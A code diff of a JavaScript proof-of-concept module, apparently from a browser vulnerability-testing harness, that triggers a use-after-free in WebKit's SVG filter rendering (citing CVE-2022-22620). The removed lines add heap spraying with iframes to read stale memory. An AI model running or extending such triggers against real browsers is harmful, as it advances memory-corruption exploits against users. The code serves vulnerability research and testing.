@@ -1,78 +1,148 @@
-
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_SVG_FILTER_UAF.JS
+ * Categoria : DOM/SVG — Use-After-Free
+ * Alvo      : WebCore::SVGFilter / RenderSVGResourceFilter C++
+ * Técnica   : Cria um SVG com <filter> aplicado via CSS filter,
+ *             remove o SVG do DOM e força um reflow. O RenderObject
+ *             pode manter ponteiro para o SVGFilter C++ depois que
+ *             o elemento SVG é coletado, causando UAF na renderização.
+ * Referência: CVE-2022-22620 (WebKit SVG filter UAF)
+ */
 
 export default {
-    id:       'SVG_CSS_FILTER_UAF',
-    category: 'DOM',
-    risk:     'CRITICAL',
-    description:
-        'UAF na Árvore de Renderização SVG. Um filtro complexo é aplicado a um nó do DOM via CSS. ' +
-        'O elemento <filter> é destruído síncronamente enquanto um recálculo de layout é forçado. ' +
-        'O RenderStyle C++ pode reter um ponteiro stale para o RenderSVGResourceFilter libertado.',
+    id:          'SVG_FILTER_UAF',
+    category:    'DOM/SVG',
+    risk:        'HIGH',
+    description: 'RenderSVGResourceFilter retém ponteiro após remoção do SVG. '
+                + 'Testa UAF no pipeline de renderização do WebCore.',
 
-    setup: function() {
-        this.results = {};
-        this.sandbox = document.getElementById('groomer-sandbox');
-        
-        // Criamos o SVG com o filtro
-        this.svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-        this.svg.innerHTML = `
-            <filter id="evilFilter">
-                <feGaussianBlur stdDeviation="5" />
-                <feColorMatrix type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0" />
-            </filter>`;
-        this.sandbox.appendChild(this.svg);
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _container:  null,
+    _svg:        null,
+    _filter:     null,
+    _target:     null,
+    _filterId:   'uaf-filter-' + Math.floor(Math.random() * 0xFFFF).toString(16),
 
-        // Criamos a cobaia que usa o filtro
-        this.target = document.createElement('div');
-        this.target.style.width = "100px";
-        this.target.style.height = "100px";
-        this.target.style.background = "red";
-        this.target.style.filter = "url(#evilFilter)"; // Liga o C++ CSS ao C++ SVG
-        this.sandbox.appendChild(this.target);
-
-        // Força o WebKit a construir a RenderTree
-        void this.target.offsetWidth;
+    supported: function() {
+        return typeof SVGElement !== 'undefined';
     },
 
-    trigger: function() {
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._container = document.createElement('div');
+        document.body.appendChild(this._container);
+
+        const ns = 'http://www.w3.org/2000/svg';
+
+        // Cria SVG com filtro complexo
+        this._svg = document.createElementNS(ns, 'svg');
+        this._svg.setAttribute('width',  '100');
+        this._svg.setAttribute('height', '100');
+        this._svg.style.cssText = 'position:absolute;left:-9999px;width:100px;height:100px';
+
+        // <defs> com <filter>
+        const defs = document.createElementNS(ns, 'defs');
+        this._filter = document.createElementNS(ns, 'filter');
+        this._filter.id = this._filterId;
+        this._filter.setAttribute('x', '0%');
+        this._filter.setAttribute('y', '0%');
+        this._filter.setAttribute('width', '100%');
+        this._filter.setAttribute('height', '100%');
+
+        // Primitivas de filtro encadeadas
+        const feGaussian = document.createElementNS(ns, 'feGaussianBlur');
+        feGaussian.setAttribute('stdDeviation', '2');
+        feGaussian.setAttribute('result', 'blurred');
+
+        const feColorMatrix = document.createElementNS(ns, 'feColorMatrix');
+        feColorMatrix.setAttribute('type', 'saturate');
+        feColorMatrix.setAttribute('values', '0');
+        feColorMatrix.setAttribute('in', 'blurred');
+
+        this._filter.appendChild(feGaussian);
+        this._filter.appendChild(feColorMatrix);
+        defs.appendChild(this._filter);
+        this._svg.appendChild(defs);
+
+        // Elemento que aplica o filtro
+        const rect = document.createElementNS(ns, 'rect');
+        rect.setAttribute('width', '100');
+        rect.setAttribute('height', '100');
+        rect.setAttribute('fill', 'blue');
+        rect.setAttribute('filter', `url(#${this._filterId})`);
+        this._svg.appendChild(rect);
+
+        this._container.appendChild(this._svg);
+
+        // Elemento HTML que referencia o filtro SVG via CSS
+        this._target = document.createElement('div');
+        this._target.style.cssText = `
+            width: 60px; height: 60px;
+            background: red;
+            filter: url(#${this._filterId});
+            position: absolute; left: -9999px;
+        `;
+        this._container.appendChild(this._target);
+
+        void this._container.offsetWidth; // força render do filtro
+        await new Promise(r => requestAnimationFrame(r));
+        await new Promise(r => setTimeout(r, 20));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Remove o SVG (libera o SVGFilter C++ e o RenderSVGResourceFilter)
+        this._svg.remove();
+
+        // Força reflow — o _target ainda tem filter: url(#...) apontando
+        // para um filtro que não existe mais no DOM
+        void this._container.offsetWidth;
+        void this._target.offsetWidth;
+
+        // Modifica o CSS do target para re-aplicar o filtro
         try {
-            // O GATILHO: Destruímos a árvore SVG que contém o filtro
-            this.svg.remove();
-            this.svg = null;
+            this._target.style.filter = `url(#${this._filterId}) blur(0px)`;
+            void this._target.offsetWidth;
+        } catch(_) {}
 
-            // Tentamos sobrepor a memória do RenderSVGResourceFilter com iframes pesados
-            let trash = Groomer.sprayDOM('iframe', 150);
+        // Remove também o target
+        this._target.remove();
+        void document.body.offsetWidth;
 
-            // A BOMBA: Pedimos as coordenadas do target.
-            // O WebKit tem que calcular o CSS, que ainda aponta para o filtro destruído!
-            this.results.rect = this.target.getBoundingClientRect();
-        } catch(e) {
-            this.results.error = e.message;
-        }
+        await new Promise(r => requestAnimationFrame(r));
+        await new Promise(r => setTimeout(r, 20));
     },
 
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O C++ sobreviveu ao layout sem craschar?
-        s => s.results.error || 'Layout Concluído',
-        
-        // Probe 1: O recálculo demorou muito? (Indica hash collision ou engine hang)
-        s => s.results.rect ? s.results.rect.width : 0,
+        // [0-3] estado do SVG após remoção
+        s => s._svg.isConnected,
+        s => s._svg.ownerDocument === document,
+        s => s._filter.isConnected,
+        s => s._filter.id,
 
-        // Probe 2: STALE DATA LEAK
-        s => {
-            // Se o motor leu a memória dos iframes em vez do filtro, o tamanho calculado 
-            // da caixa pode saltar de 100 para um número absurdo (lixo da RAM).
-            if (s.results.rect && s.results.rect.width > 200) {
-                return s.results.rect.width; // Retorna o valor bruto para o HUD gritar STALE DATA!
-            }
-            return 0; // Seguro
-        }
+        // [4-7] propriedades do filter element
+        s => s._filter.getAttribute('x'),
+        s => s._filter.childNodes.length,
+        s => typeof s._filter,
+        s => s._filter instanceof SVGElement,
+
+        // [8-10] target HTML com filter referenciando SVG removido
+        s => s._target.isConnected,
+        s => s._target.style.filter,
+        s => window.getComputedStyle(s._target)?.filter ?? 'null',
+
+        // [11] container intacto
+        s => s._container.isConnected,
+        s => s._container.children.length,
     ],
 
-    cleanup: function() {
-        try { this.target.remove(); } catch(e) {}
-        this.target = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._container?.remove();
+        this._container = null;
+        this._svg       = null;
+        this._filter    = null;
+        this._target    = null;
     }
 };
